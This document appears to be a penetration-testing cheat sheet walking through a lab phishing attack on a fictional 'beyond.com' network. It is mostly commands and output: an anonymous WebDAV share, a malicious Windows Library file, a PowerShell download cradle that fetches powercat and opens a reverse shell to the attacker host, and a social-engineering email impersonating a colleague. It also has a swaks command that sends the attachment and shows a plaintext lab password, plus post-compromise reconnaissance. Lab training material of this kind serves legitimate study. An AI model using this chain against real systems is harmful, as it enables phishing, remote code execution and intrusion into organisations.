# Phishing for Access

Starting WsgiDAV on port 80
>``` shell
>kali@kali:~$ mkdir /home/kali/beyond/webdav
>
>kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
>
># ========== Expected Result ==========
>Running without configuration file.
>04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
>04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
>04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
>04:47:04.861 - INFO    : Property manager:  None
>04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
>04:47:04.861 - INFO    : Registered DAV providers by route:
>04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
>04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
>04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
>04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
>04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
>04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
>04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
># =====================================
>```

Empty Library file in Visual Studio Code
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Phishing-for-Access-1.png)

Windows Library code for connecting to our WebDAV Share
>``` shell
><?xml version="1.0" encoding="UTF-8"?>
><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
><name>@windows.storage.dll,-34582</name>
><version>6</version>
><isLibraryPinned>true</isLibraryPinned>
><iconReference>imageres.dll,-1003</iconReference>
><templateInfo>
><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
></templateInfo>
><searchConnectorDescriptionList>
><searchConnectorDescription>
><isDefaultSaveLocation>true</isDefaultSaveLocation>
><isSupported>false</isSupported>
><simpleLocation>
><url>http://192.168.119.5</url>
></simpleLocation>
></searchConnectorDescription>
></searchConnectorDescriptionList>
></libraryDescription>
>```

PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file
>``` shell
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
>```

Serving powercat.ps1 on port 8000 via Python3 web server
>``` shell
>kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
>
>kali@kali:~/beyond$ python3 -m http.server 8000
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
># =====================================
>```

Listening on port 4444 with Netcat
>``` shell
>kali@kali:~/beyond$ nc -nvlp 4444  
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
># =====================================
>```

Create the body.txt file in /home/kali/beyond
>``` shell
>Hey!
>I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.
>
>On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
>
>John
>```

Sending emails with the Windows Library file as attachment to marcus and daniela
>``` shell
>kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
>
># ========== Expected Result ==========
>Username: john
>Password: dqsTwTpZPn#nL
>=== Trying 192.168.50.242:25...
>=== Connected to 192.168.50.242.
><-  220 MAILSRV1 ESMTP
> -> EHLO kali
><-  250-MAILSRV1
><-  250-SIZE 20480000
><-  250-AUTH LOGIN
><-  250 HELP
> -> AUTH LOGIN
><-  334 VXNlcm5hbWU6
> -> am9obg==
><-  334 UGFzc3dvcmQ6
> -> ZHFzVHdUcFpQbiNuTA==
><-  235 authenticated.
> -> MAIL FROM:<john@beyond.com>
><-  250 OK
> -> RCPT TO:<marcus@beyond.com>
><-  250 OK
> -> DATA
><-  354 OK, send.
> -> 36 lines sent
><-  250 Queued (1.088 seconds)
> -> QUIT
><-  221 goodbye
>=== Connection closed with remote host.
># =====================================
>```

Incoming reverse shell on port 4444
>``` shell
>listening on [any] 4444 ...
>connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
>
>PS C:\Windows\System32\WindowsPowerShell\v1.0> 
>```

Obtaining basic information about the target machine
>``` shell
>PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
>
># ========== Expected Result ==========
>whoami
>beyond\marcus
># =====================================
>
>PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
>
># ========== Expected Result ==========
>hostname
>CLIENTWK1
># =====================================
>
>PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
>
># ========== Expected Result ==========
>ipconfig
>
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0:
>
>   Connection-specific DNS Suffix  . : 
>   IPv4 Address. . . . . . . . . . . : 172.16.6.243
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 172.16.6.254
># =====================================
>```
